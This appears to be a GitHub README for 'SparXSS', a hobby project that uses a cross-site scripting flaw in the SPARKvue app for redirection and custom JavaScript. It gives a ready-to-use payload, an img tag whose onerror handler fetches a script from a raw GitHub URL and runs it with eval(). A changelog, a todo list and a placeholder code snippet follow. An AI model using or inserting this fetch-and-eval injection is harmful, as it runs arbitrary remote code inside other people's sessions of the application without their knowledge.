## A JS Script For Redirection And Custom Javascript Execution For The SPARKvue XSS Vulnerability Found By ohonbob

Run it using:<br>```<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r => r.text()).then(c => eval(c))'>```

The If Statement In The First Line Was Because It Would Execute Multiple Times While I Was Testing It

## ToDo
- ~~Make Icon's Show up for Every URL~~
- Make the custom URL's stay when you export the .spklab file (close to getting this working)

## Changelog

10/24/2023
- The checkpoint2 and getFaviconUrl functions have been combined into 1 function (only checkpoint2 now)
- The Hyperlink URL can now have https:// when it could not before
- Uploaded New SparXSS.spklab file to reflect the updates made so far

```
function test() {
  console.log("This code will have a copy button to the right of it");
}
```
